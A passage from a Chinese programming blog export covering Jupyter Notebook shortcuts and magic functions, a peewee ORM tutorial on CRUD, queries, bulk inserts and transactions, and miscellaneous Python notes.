<p>8）行号显示键</p>
<p>在其他编程环境中也许会显示代码行号，但是在Jupyter的默认情况下是没有代码行号的，如果期望一个cell中显示所有代码对于的行编号，可以在command模式下，按一次字母l键。</p>
<p>9）code与markdown间切换键</p>
<p>code指的是Jupyter环境下所进行的Python代码的编写，而markdown则是用于非代码的笔记内容的编写。两者之间是可以轻松切换的，在command模式下，按一次字母m便从code切换到markdowen模式；如果从command模式中，按一次字母y就可以从markdown模式切换到code模式。</p>
<p>2、Jupyter中的魔法函数</p>
<p>1）%pwd</p>
<p>该魔法函数用于显示Jupyter当前的工作空间。</p>
<p>2）%hist</p>
<p>该魔法函数用于显示当前Jupyter中，所有运行过的历史代码。</p>
<p>3）%who</p>
<p>该魔法函数用于显示当前Jupyter环境中的所有变量或名称。</p>
<p>4）%reset</p>
<p>该魔法函数用于删除当前Jupyter环境中的所有变量或名称。</p>
<p>5)%time</p>
<p>该魔法函数用于计算当前代码行的运行时长。</p>
<p>6)%timeit</p>
<p>该魔法函数用于计算当前代码行的平均运行时长（即在执行一个语句100000次(默认情况下)后，再给出运行最快3次的平均值。</p>
<p>7)%%timeit</p>
<p>该魔法函数用于计算当前cell的代码运行时长。</p>
<p>8）%matplotlib</p>
<p>该魔法函数用于显示绘图结果的风格，默认为%matplotlib inline，是直接将图片显示在浏览器中，如果希望图片单独生成，可以使用%matplotlib。</p>
<p>9）%load</p>
<p>该魔法函数用于加载本地Python文件或者网络中的Python文件，例如本地脚本文件的加载：%load xxx.py。</p>
<p>10）%run</p>
<p>该魔法函数用于运行本地或网络中的Python文件，例如本地脚本文件的运行：%load xxx.py。</p>
<h2 id="其他连接"><a href="#其他连接" class="headerlink" title="其他连接"></a>其他连接</h2><p><a href="http://url.cn/5xxEBSt" target="_blank" rel="noopener">jupyter notebook系列之 自定义主题、字体、字号等(WX)</a><br><a href="http://url.cn/5SelJCe" target="_blank" rel="noopener">python开发者必备，史上最详细的 jupyter 教程(WX)</a></p>
<p><a href="https://www.bilibili.com/read/cv1924277/" target="_blank" rel="noopener">在 jupyter 里使用 C++(B站文章)</a></p>
<p><a href="http://url.cn/52mfLFI" target="_blank" rel="noopener">Jupyter Notebook界面也可以如此炫酷？有人把Notebook玩出了新花样</a></p>
<p><a href="http://url.cn/5C4F90n" target="_blank" rel="noopener">十大至简规则！</a></p>
<p><a href="http://url.cn/5aK81xZ" target="_blank" rel="noopener">15 款好用到爆炸的 Jupyter Lab 插件</a></p>
<p><a href="http://url.cn/5ojkUbV" target="_blank" rel="noopener"> JupyterLab，极其强大的下一代 notebook</a></p>
<p><a href="http://url.cn/5Ruo79B" target="_blank" rel="noopener">Jupyter在美团民宿的应用实践</a></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>jupyter</tag>
      </tags>
  </entry>
  <entry>
    <title>python-peewee</title>
    <url>/python-peewee/</url>
    <content><![CDATA[<h2 id="全部数据类型"><a href="#全部数据类型" class="headerlink" title="全部数据类型"></a>全部数据类型</h2><p><img data-src="http://tuchuang.xchcloud.cn/20210319141915.png" alt="20210319141915"></p>
<h2 id="定义Model，建立数据库"><a href="#定义Model，建立数据库" class="headerlink" title="定义Model，建立数据库"></a>定义Model，建立数据库</h2><h3 id="第一种方式："><a href="#第一种方式：" class="headerlink" title="第一种方式："></a>第一种方式：</h3><p>先定义Model，然后通过db.create_tables()创建或Model.create_table()创建表。<br><a id="more"></a><br>例如，我们需要建一个Person表，里面有name、birthday和is_relative三个字段，我们定义的Model如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from peewee import *</span><br><span class="line"></span><br><span class="line"># 连接数据库</span><br><span class="line">database = MySQLDatabase(&apos;test&apos;, user=&apos;root&apos;, host=&apos;localhost&apos;, port=3306)</span><br><span class="line"></span><br><span class="line"># 定义Person</span><br><span class="line">class Person(Model):</span><br><span class="line">    name = CharField()</span><br><span class="line">    birthday = DateField()</span><br><span class="line">    is_relative = BooleanField()</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        database = database</span><br><span class="line">然后，我们就可以创建表了</span><br><span class="line"></span><br><span class="line"># 创建表</span><br><span class="line">Person.create_table()</span><br></pre></td></tr></table></figure></p>
<p>创建表也可以这样, 可以创建多个<br>database.create_tables([Person])<br>其中，CharField、DateField、BooleanField等这些类型与数据库中的数据类型一一对应，我们直接使用它就行，至于CharField =&gt; varchar(255)这种转换Peewee已经为我们做好了 。</p>
<h3 id="第二种方式："><a href="#第二种方式：" class="headerlink" title="第二种方式："></a>第二种方式：</h3><p>已经存在过数据库，则直接通过python -m pwiz批量创建Model。<br>例如，上面我已经创建好了test库，并且创建了Person表，表中拥有id、name、birthday和is_relative字段。那么，我可以使用下面命令：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 指定mysql，用户为root，host为localhost，数据库为test</span><br><span class="line">python -m pwiz -e mysql -u root -H localhost --password test &gt; testModel.py</span><br><span class="line">然后，输入密码，pwiz脚本会自动创建Model，内容如下：</span><br><span class="line"></span><br><span class="line">from peewee import *</span><br><span class="line"></span><br><span class="line">database = MySQLDatabase(&apos;test&apos;, **&#123;&apos;charset&apos;: &apos;utf8&apos;, &apos;use_unicode&apos;: True, &apos;host&apos;: &apos;localhost&apos;, &apos;user&apos;: &apos;root&apos;, &apos;password&apos;: &apos;&apos;&#125;)</span><br><span class="line"></span><br><span class="line">class UnknownField(object):</span><br><span class="line">    def __init__(self, *_, **__): pass</span><br><span class="line"></span><br><span class="line">class BaseModel(Model):</span><br><span class="line">    class Meta:</span><br><span class="line">        database = database</span><br><span class="line"></span><br><span class="line">class Person(BaseModel):</span><br><span class="line">    birthday = DateField()</span><br><span class="line">    is_relative = IntegerField()</span><br><span class="line">    name = CharField()</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        table_name = &apos;person&apos;</span><br></pre></td></tr></table></figure></p>
<p>操作数据库<br>操作数据库，就是增、删、改和查。</p>
<h2 id="一、增"><a href="#一、增" class="headerlink" title="一、增"></a>一、增</h2><p>直接创建示例，然后使用save()就添加了一条新数据<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 添加一条数据</span><br><span class="line">p = Person(name=&apos;liuchungui&apos;, birthday=date(1990, 12, 20), is_relative=True)</span><br><span class="line">p.save()</span><br></pre></td></tr></table></figure></p>
<h3 id="二、删"><a href="#二、删" class="headerlink" title="二、删"></a>二、删</h3><p>使用delete().where().execute()进行删除，where()是条件，execute()负责执行语句。若是已经查询出来的实例，则直接使用delete_instance()删除。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 删除姓名为perter的数据</span><br><span class="line">Person.delete().where(Person.name == &apos;perter&apos;).execute()</span><br><span class="line"></span><br><span class="line"># 已经实例化的数据, 使用delete_instance</span><br><span class="line">p = Person(name=&apos;liuchungui&apos;, birthday=date(1990, 12, 20), is_relative=False)</span><br><span class="line">p.id = 1</span><br><span class="line">p.save()</span><br><span class="line">p.delete_instance()</span><br></pre></td></tr></table></figure></p>
<h3 id="三、改"><a href="#三、改" class="headerlink" title="三、改"></a>三、改</h3><p>若是，已经添加过数据的的实例或查询到的数据实例，且表拥有primary key时，此时使用save()就是修改数据；若是未拥有实例，则使用update().where()进行更新数据。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 已经实例化的数据,指定了id这个primary key,则此时保存就是更新数据</span><br><span class="line">p = Person(name=&apos;liuchungui&apos;, birthday=date(1990, 12, 20), is_relative=False)</span><br><span class="line">p.id = 1</span><br><span class="line">p.save()</span><br><span class="line"></span><br><span class="line"># 更新birthday数据</span><br><span class="line">q = Person.update(&#123;Person.birthday: date(1983, 12, 21)&#125;).where(Person.name == &apos;liuchungui&apos;)</span><br><span class="line">q.execute()</span><br></pre></td></tr></table></figure></p>
<h3 id="四、查"><a href="#四、查" class="headerlink" title="四、查"></a>四、查</h3><p>单条数据使用Person.get()就行了，也可以使用Person.select().where().get()。若是查询多条数据，则使用Person.select().where()，去掉get()就行了。语法很直观，select()就是查询，where是条件，get是获取第一条数据。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查询单条数据</span><br><span class="line">p = Person.get(Person.name == &apos;liuchungui&apos;)</span><br><span class="line">print(p.name, p.birthday, p.is_relative)</span><br><span class="line"></span><br><span class="line"># 使用where().get()查询</span><br><span class="line">p = Person.select().where(Person.name == &apos;liuchungui&apos;).get()</span><br><span class="line">print(p.name, p.birthday, p.is_relative)</span><br><span class="line"></span><br><span class="line"># 查询多条数据</span><br><span class="line">persons = Person.select().where(Person.is_relative == True)</span><br><span class="line">for p in persons:</span><br><span class="line">    print(p.name, p.birthday, p.is_relative)</span><br></pre></td></tr></table></figure></p>
<h4 id="1、查询单条数据"><a href="#1、查询单条数据" class="headerlink" title="1、查询单条数据"></a>1、查询单条数据</h4><p>我们可以直接使用get()获取单条数据，在参数中传递查询条件。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查询name为liuchungui的Person</span><br><span class="line">p = Person.get(Person.name == &apos;liuchungui&apos;)</span><br><span class="line">print(p.name) # 打印出liuchungui</span><br></pre></td></tr></table></figure></p>
<h4 id="2、查询多条数据"><a href="#2、查询多条数据" class="headerlink" title="2、查询多条数据"></a>2、查询多条数据</h4><p>使用select()查询，后面不添加where()是查询整个表的内容。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查询Person整张表的数据</span><br><span class="line">persons = Person.select()</span><br><span class="line"># 遍历数据</span><br><span class="line">for p in persons:</span><br><span class="line">    print(p.name, p.birthday, p.is_relative)</span><br></pre></td></tr></table></figure></p>
<p>我们可以在select()后面添加where()当做查询条件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 获取is_relative为True的数据</span><br><span class="line">persons = Person.select().where(Person.is_relative == True)</span><br><span class="line">for p in persons:</span><br><span class="line">    print(p.name, p.birthday, p.is_relative)</span><br></pre></td></tr></table></figure></p>
<p>我们可以通过sql()方法转换为SQL语句进行查看理解<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">persons = Person.select().where(Person.is_relative == True)</span><br><span class="line"># 打印出的结果为：(&apos;SELECT `t1`.`id`, `t1`.`name`, `t1`.`is_relative` FROM `Person` AS `t1` WHERE (`t1`.`is_relative` = %s)&apos;, [True])</span><br><span class="line">print(persons.sql())</span><br></pre></td></tr></table></figure></p>
<p>使用 filter()函数<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    ps = Person.filter(name=&apos;bobby&apos;)</span><br><span class="line">    for item in ps:</span><br><span class="line">        print(item.name)    # bobby</span><br></pre></td></tr></table></figure></p>
<h4 id="3、查询数据条数、排序、Limit"><a href="#3、查询数据条数、排序、Limit" class="headerlink" title="3、查询数据条数、排序、Limit"></a>3、查询数据条数、排序、Limit</h4><p>查询数据条数，直接在后面加上count()就行了<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查询整张表的数据条数</span><br><span class="line">total_num = Person.select().count()</span><br><span class="line"></span><br><span class="line"># 查询name为liuchungui的Person数量, 返回数量为1</span><br><span class="line">num = Person.select().where(Person.name == &apos;liuchungui&apos;).count()</span><br></pre></td></tr></table></figure></p>
<p>排序，使用的是order_by()，参数内加上按对应字段进行排序<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 按照创建时间降序排序</span><br><span class="line">persons = Person.select().order_by(Person.create_time.desc())</span><br><span class="line"></span><br><span class="line"># 按照创建时间升序排序</span><br><span class="line">persons = Person.select().order_by(Person.create_time.asc())</span><br></pre></td></tr></table></figure></p>
<p>Limit是使用limit()，传递一个数字，例如2就是获取前两条数据，它可以搭配offset()一起使用<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 相当于sql语句: select * from person order by create_time desc limit 5</span><br><span class="line">persons = Person.select().order_by(Person.create_time.asc()).limit(5)</span><br><span class="line"></span><br><span class="line"># 相当于sql语句中：select * from person order by create_time desc limit 2, 5</span><br><span class="line">persons = Person.select().order_by(Person.create_time.asc()).limit(5).offset(2)</span><br></pre></td></tr></table></figure></p>
<h4 id="四、查询操作符"><a href="#四、查询操作符" class="headerlink" title="四、查询操作符"></a>四、查询操作符</h4><p><img data-src="http://tuchuang.xchcloud.cn/20210319140423.png" alt="20210319140423"></p>
<p>其中，==、&lt;、&lt;=、&gt;、&gt;=、!=是很容易理解的，重点提下&lt;&lt;、&gt;&gt;和%。用示例说明：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># &lt;&lt;使用，查询省份属于湖北和湖南的，对应sql语句：select * from person where province in (&apos;湖南&apos;, &apos;湖北&apos;)</span><br><span class="line">persons = Person.select().where(Person.province &lt;&lt; [&apos;湖南&apos;, &apos;湖北&apos;])</span><br><span class="line"></span><br><span class="line"># &gt;&gt;使用，查询省份为空的，sql语句: select * from person where province is Null</span><br><span class="line">persons = Person.select().where(Person.province &gt;&gt; None)</span><br><span class="line"></span><br><span class="line"># %使用，查询省份中含有 湖 字，sql语句：select * from person where province like &apos;%湖%&apos;</span><br><span class="line">persons = Person.select().where(Person.province % &apos;%湖%&apos;)</span><br></pre></td></tr></table></figure></p>
<p>有时，我们查询条件不止一个，需要使用逻辑运算符连接，而Python中的and、or在Peewee是不支持的，此时我们需要使用Peewee封装好的运算符，如下：</p>
<p><img data-src="http://tuchuang.xchcloud.cn/20210319140522.png" alt="20210319140522"></p>
<p>使用示例如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查询湖南和湖北的, 注意需要用()将Person.province == &apos;湖南&apos;包一层</span><br><span class="line">persons = Person.select().where((Person.province == &apos;湖南&apos;) | (Person.province == &apos;湖北&apos;))</span><br><span class="line"></span><br><span class="line"># 查询湖南和身高1.75</span><br><span class="line">persons = Person.select().where((Person.province == &apos;湖南&apos;) &amp; (Person.height == 1.75))</span><br><span class="line">注意：使用的时候，需要内部还使用()将Person.province == &apos;湖南&apos;包起来，否则不会生效。示例：persons = Person.select().where((Person.province == &apos;湖南&apos;) | (Person.province == &apos;湖北&apos;))</span><br></pre></td></tr></table></figure></p>
<p>除了上面的操作符以外，Peewee还有更多没有重载的操作符，如下：</p>
<p><img data-src="http://tuchuang.xchcloud.cn/20210319140550.png" alt="20210319140550"></p>
<h4 id="五、联表查询"><a href="#五、联表查询" class="headerlink" title="五、联表查询"></a>五、联表查询</h4><p>有时，我们需要查询两个表中的数据，在Peewee中也可以实现，官方示例如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">query = (Tweet</span><br><span class="line">         .select(Tweet.content, Tweet.timestamp, User.username)</span><br><span class="line">         .join(User, on=(User.id == Tweet.user_id))</span><br><span class="line">         .order_by(Tweet.timestamp.desc()))</span><br></pre></td></tr></table></figure></p>
<p>上面查询的结果，会在Tweet的Model中添加一个属性user，此时我们可以通过user来访问到查询到的User表信息，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for tweet in query:</span><br><span class="line">    print(tweet.content, tweet.timestamp, tweet.user.username)</span><br></pre></td></tr></table></figure>
<h2 id="Peewee批量插入数据"><a href="#Peewee批量插入数据" class="headerlink" title="Peewee批量插入数据"></a>Peewee批量插入数据</h2><p>最近，需要同步数据到Mysql中，数据量有几百万。但是，自己写一个for循环，然后使用Model.create()添加，发现这种方式特别慢。难道，像去年爬数据一样，将几百万的数据从Redis取出来，然后使用多线程进行保存？</p>
<p>在Google上搜索了之后，找到一种更简单的方式，那就是使用Peewee原生的方法insert_many()，进行批量数据插入。</p>
<p>那么，它的速度有多快？</p>
<p>下面，是我简单的比较了插入10000条数据到本地数据库中，四种方式所需要的时间。</p>
<h3 id="第一种，for循环和Model-create"><a href="#第一种，for循环和Model-create" class="headerlink" title="第一种，for循环和Model.create()"></a>第一种，for循环和Model.create()</h3><p>代码如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from xModels import XUser, database</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">NUM = 10000</span><br><span class="line">start_time = time.time()</span><br><span class="line"></span><br><span class="line">users = []</span><br><span class="line">for i in range(NUM):</span><br><span class="line">    XUser.create(phone=&apos;13847374833&apos;, password=&apos;123456&apos;)</span><br></pre></td></tr></table></figure></p>
<p>print(“插入{}条数据, 花费: {:.3}秒”.format(NUM, time.time()-start_time))<br>结果：插入10000条数据, 花费: 10.5秒</p>
<h3 id="第二种，for循环和Model-create-，并放入事务中"><a href="#第二种，for循环和Model-create-，并放入事务中" class="headerlink" title="第二种，for循环和Model.create()，并放入事务中"></a>第二种，for循环和Model.create()，并放入事务中</h3><p>代码如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from xModels import XUser, database</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">NUM = 10000</span><br><span class="line">start_time = time.time()</span><br><span class="line"></span><br><span class="line">with database.atomic():</span><br><span class="line">    for i in range(NUM):</span><br><span class="line">        XUser.create(phone=&apos;13847374833&apos;, password=&apos;123456&apos;)</span><br></pre></td></tr></table></figure></p>
<p>print(“插入{}条数据, 花费: {:.3}秒”.format(NUM, time.time()-start_time))<br>结果：插入10000条数据, 花费: 4.94秒</p>
<h3 id="第三种，使用原生的insert-many-方法"><a href="#第三种，使用原生的insert-many-方法" class="headerlink" title="第三种，使用原生的insert_many()方法"></a>第三种，使用原生的insert_many()方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from xModels import XUser, database</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">NUM = 10000</span><br><span class="line">data = [&#123;</span><br><span class="line">            &apos;phone&apos;: &apos;13847374833&apos;,</span><br><span class="line">            &apos;password&apos;: &apos;123456&apos;</span><br><span class="line">        &#125; for i in range(NUM)]</span><br><span class="line"></span><br><span class="line">start_time = time.time()</span><br><span class="line"></span><br><span class="line">for i in range(0, NUM, 100):</span><br><span class="line">    XUser.insert_many(data[i:i + 100]).execute()</span><br></pre></td></tr></table></figure>
<p>print(“插入{}条数据, 花费: {:.3}秒”.format(NUM, time.time()-start_time))<br>结果：插入10000条数据, 花费: 0.505秒</p>
<p>第四种，使用原生的insert_many()方法，并放入事务中<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from xModels import XUser, database</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">NUM = 10000</span><br><span class="line">data = [&#123;</span><br><span class="line">            &apos;phone&apos;: &apos;13847374833&apos;,</span><br><span class="line">            &apos;password&apos;: &apos;123456&apos;</span><br><span class="line">        &#125; for i in range(NUM)]</span><br><span class="line"></span><br><span class="line">start_time = time.time()</span><br><span class="line"></span><br><span class="line">with database.atomic():</span><br><span class="line">    for i in range(0, NUM, 100):</span><br><span class="line">        # 每次批量插入100条，分成多次插入</span><br><span class="line">        XUser.insert_many(data[i:i + 100]).execute()</span><br></pre></td></tr></table></figure></p>
<p>print(“插入{}条数据, 花费: {:.3}秒”.format(NUM, time.time()-start_time))<br>结果：插入10000条数据, 花费: 0.401秒</p>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>insert_many()比使用for+Model.create()方式快很多，在上面例子中快了十倍不止<br>使用事务，可以些许提升</p>
<h2 id="Peewee使用之事务"><a href="#Peewee使用之事务" class="headerlink" title="Peewee使用之事务"></a>Peewee使用之事务</h2><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><p>Peewee实现事务最常用的方法是Database.atomic()方法，非常简单，代码示例如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from xModels import XUser, database</span><br><span class="line"></span><br><span class="line">with database.atomic() as transaction:</span><br><span class="line">    XUser.create(phone=&apos;184738373833&apos;, password=&apos;123456&apos;)</span><br><span class="line">    XUser.create(phone=&apos;184738373833332323232&apos;, password=&apos;123456&apos;)</span><br><span class="line">当事务执行成功之后，它会自动commit()，不需要我们手动调。当事务的代码块中抛出异常时，它会自动调用rollback()。</span><br></pre></td></tr></table></figure></p>
<p>例如，如果上面的phone设置了长度限制，第二条语句中的phone太长，那么就会抛出异常，然后上面结果是两个用户都不会被添加到数据库中。</p>
<p>注意：上面database是在xModels文件中MySQLDatabase的一个实例，创建方法如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from peewee import MySQLDatabase</span><br><span class="line">database = MySQLDatabase(&apos;test&apos;, **&#123;&apos;charset&apos;: &apos;utf8&apos;, &apos;use_unicode&apos;: True, &apos;host&apos;: &apos;localhost&apos;, &apos;user&apos;: &apos;root&apos;, &apos;password&apos;: &apos;&apos;&#125;)</span><br><span class="line">除了自动commit()和rollback()之外，我们也可以手动调用commit()和rollback()方法。</span><br></pre></td></tr></table></figure></p>
<p>例如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">with database.atomic() as transaction:</span><br><span class="line">    XUser.create(phone=&apos;199999999999&apos;, password=&apos;123456&apos;)</span><br><span class="line">    transaction.commit()</span><br><span class="line">    XUser.create(phone=&apos;188888888888&apos;, password=&apos;123456&apos;)</span><br><span class="line">    transaction.rollback()</span><br><span class="line">结果：手动调用了commit()，phone为199999999999的用户成功添加，而188888888888因为rollback()，不会被添加到数据库中。</span><br></pre></td></tr></table></figure></p>
<h3 id="两种使用方式"><a href="#两种使用方式" class="headerlink" title="两种使用方式"></a>两种使用方式</h3><p>Peewee中实现事务有两种使用方式，一种是将atomic当做Context manager使用，另外一种将atomic当修饰器使用。</p>
<h4 id="Context-manager"><a href="#Context-manager" class="headerlink" title="Context manager"></a>Context manager</h4><p>这种方式，就是我们前面已经使用过了，示例如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from xModels import XUser, database</span><br><span class="line"></span><br><span class="line">with database.atomic() as transaction:</span><br><span class="line">    XUser.create(phone=&apos;184738373833&apos;, password=&apos;123456&apos;)</span><br><span class="line">    XUser.create(phone=&apos;184738373833332323232&apos;, password=&apos;123456&apos;)</span><br><span class="line">修饰器</span><br><span class="line">@database.atomic()</span><br><span class="line">def create_user(phone, password):</span><br><span class="line">    XUser.create(phone=phone, password=password)</span><br><span class="line">    raise Exception(&apos;just a test&apos;)</span><br><span class="line"></span><br><span class="line">create_user(phone=&apos;184738373833&apos;, password=&apos;383838&apos;)</span><br><span class="line">上面，由于create_user()中抛出了一个异常，修饰器中会执行rollback()，从而导致创建用户失败。</span><br></pre></td></tr></table></figure></p>
<h4 id="事务嵌套使用"><a href="#事务嵌套使用" class="headerlink" title="事务嵌套使用"></a>事务嵌套使用</h4><p>Peewee中事务还可以进行嵌套，示例如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">with database.atomic() as txn:</span><br><span class="line">    XUser.create(phone=&apos;18734738383&apos;)</span><br><span class="line"></span><br><span class="line">    with database.atomic() as nested_txn:</span><br><span class="line">        XUser.create(phone=&apos;1883328484&apos;)</span><br><span class="line">当上面没有抛出异常时，两个用户同时被添加；当其中任何一条语句抛出异常时，两个用户都不会添加。</span><br></pre></td></tr></table></figure></p>
<p>不过，它还是跟非嵌套有些区别的，看下面示例。</p>
<h4 id="第一种情况，在嵌套事务中执行rollback-，代码如下："><a href="#第一种情况，在嵌套事务中执行rollback-，代码如下：" class="headerlink" title="第一种情况，在嵌套事务中执行rollback()，代码如下："></a>第一种情况，在嵌套事务中执行rollback()，代码如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">with database.atomic() as txn:</span><br><span class="line">    XUser.create(phone=&apos;188888888&apos;)</span><br><span class="line"></span><br><span class="line">    with database.atomic() as nested_txn:</span><br><span class="line">        XUser.create(phone=&apos;199999999&apos;)</span><br><span class="line">        nested_txn.rollback()</span><br><span class="line">结果：188888888用户被添加，而199999999不会被添加。</span><br></pre></td></tr></table></figure>
<h4 id="第二种情况，在外层的事务中执行rollback-，代码如下："><a href="#第二种情况，在外层的事务中执行rollback-，代码如下：" class="headerlink" title="第二种情况，在外层的事务中执行rollback()，代码如下："></a>第二种情况，在外层的事务中执行rollback()，代码如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">with database.atomic() as txn:</span><br><span class="line">    XUser.create(phone=&apos;188888888&apos;)</span><br><span class="line"></span><br><span class="line">    with database.atomic() as nested_txn:</span><br><span class="line">        XUser.create(phone=&apos;199999999&apos;)</span><br><span class="line"></span><br><span class="line">    txn.rollback()</span><br><span class="line">结果：两个用户都不会被添加。</span><br></pre></td></tr></table></figure>
<p>也就是说，外层的rollback()会将嵌套中的事务也回滚，而嵌套中的事务不能回滚外层的内容。当然，这只是我的一个尝试，可能还有其他的不同，还需要再探索。</p>
<h3 id="全手动实现事务"><a href="#全手动实现事务" class="headerlink" title="全手动实现事务"></a>全手动实现事务</h3><p>全手动实现事务使用的是Database.manual_commit()方法，它也有Context manager和修饰器两种方式。</p>
<p>下面，我们使用Context manager方式来实现前面说的atomic()方法，示例代码如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">with database.manual_commit():</span><br><span class="line">    database.begin()  # 开始事务</span><br><span class="line">    try:</span><br><span class="line">        XUser.create(phone=&apos;188888888&apos;) # 添加用户</span><br><span class="line">    except:</span><br><span class="line">        database.rollback()  # 执行rollback</span><br><span class="line">        raise</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            database.commit()  # 没有发生异常，执行commit</span><br><span class="line">        except:</span><br><span class="line">            database.rollback() #commit发生异常时，执行rollback</span><br><span class="line">            raise</span><br></pre></td></tr></table></figure></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Peewee实现事务最简单的方法就是atomic()，它可以使用Context manager和修饰器两种方式，它也可以手动调用commit()和rollback()。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>python</tag>
        <tag>peewee</tag>
      </tags>
  </entry>
  <entry>
    <title>python查缺补漏</title>
    <url>/python%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F/</url>
    <content><![CDATA[<h2 id="使用技巧"><a href="#使用技巧" class="headerlink" title="使用技巧"></a>使用技巧</h2><h3 id="linux-下配置快捷启动方式"><a href="#linux-下配置快捷启动方式" class="headerlink" title="linux 下配置快捷启动方式"></a>linux 下配置快捷启动方式</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim ~/.bashrc</span><br><span class="line"></span><br><span class="line">alias pycharm=&quot;bash /home/bobby/Downloads/pycharm-2016.3.2/bin/pycharm.sh&quot;</span><br><span class="line"></span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h3 id="加快-pip-安装速度"><a href="#加快-pip-安装速度" class="headerlink" title="加快 pip 安装速度"></a>加快 pip 安装速度</h3><p><code>pip3 install -i https://pypi.douban.com/simple django</code></p>
<h3 id="安装包出现报错解决方法"><a href="#安装包出现报错解决方法" class="headerlink" title="安装包出现报错解决方法"></a>安装包出现报错解决方法</h3><p><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/" target="_blank" rel="noopener">https://www.lfd.uci.edu/~gohlke/pythonlibs/</a></p>
<h3 id="加速-npm-镜像"><a href="#加速-npm-镜像" class="headerlink" title="加速 npm 镜像"></a>加速 npm 镜像</h3><p><a href="http://npm.taobao.org/" target="_blank" rel="noopener">淘宝镜像</a></p>
<h2 id="2019-4-12"><a href="#2019-4-12" class="headerlink" title="2019.4.12"></a>2019.4.12</h2><h3 id="new、init"><a href="#new、init" class="headerlink" title="new、init"></a>new、init</h3><p>在 Python 3 的类中，<em>new</em> 负责对象的创建，而 <em>init</em> 负责对象的初始化；<em>new</em> 是一个类方法，而 <em>init</em> 是一个对象方法。</p>
<p><em>new</em> 是我们通过类名进行实例化对象时自动调用的，<em>init</em> 是在每一次实例化对象之后调用的，<em>new</em> 方法创建一个实例之后返回这个实例对象，并将其传递给 <em>init</em> 方法的 self 参数。</p>
<p><a href="https://blog.csdn.net/luoweifu/article/details/82732313" target="_blank" rel="noopener">深入理解Python中的 _ <em>new</em> _ 和 _ <em>init</em> _</a></p>
<p>##3 metaclass()</p>
<h4 id="内置函数-type-和-isinstance"><a href="#内置函数-type-和-isinstance" class="headerlink" title="内置函数 type() 和 isinstance()"></a>内置函数 type() 和 isinstance()</h4><ul>
<li>type()</li>
</ul>
<p>（1）查看一个变量（对象）的类型；<br>（2）创建一个类（class）</p>
<h2 id="2019-6-4"><a href="#2019-6-4" class="headerlink" title="2019.6.4"></a>2019.6.4</h2><h3 id="jquery"><a href="#jquery" class="headerlink" title="jquery"></a>jquery</h3><p>jQuery 是一个 JavaScript 库。</p>
<p>jQuery 极大地简化了 JavaScript 编程。</p>
<p>要爬取静态网页的html代码，可以使用 jquery去模仿写html。</p>
<h3 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h3><p>AJAX = Asynchronous JavaScript and XML（异步的 JavaScript 和 XML）。</p>
<p>AJAX 不是新的编程语言，而是一种使用现有标准的新方法。</p>
<p>AJAX 最大的优点是在不重新加载整个页面的情况下，可以与服务器交换数据并更新部分网页内容。</p>
<p>AJAX 不需要任何浏览器插件，但需要用户允许JavaScript在浏览器上执行。</p>
<p><a href="https://www.runoob.com/ajax/ajax-tutorial.html" target="_blank" rel="noopener">菜鸟教程</a></p>
<h3 id="Python-enumerate-函数"><a href="#Python-enumerate-函数" class="headerlink" title="Python enumerate() 函数"></a>Python enumerate() 函数</h3><p>enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。</p>
<p>语法<br>以下是 enumerate() 方法的语法:</p>
<p><code>enumerate(sequence, [start=0])</code></p>
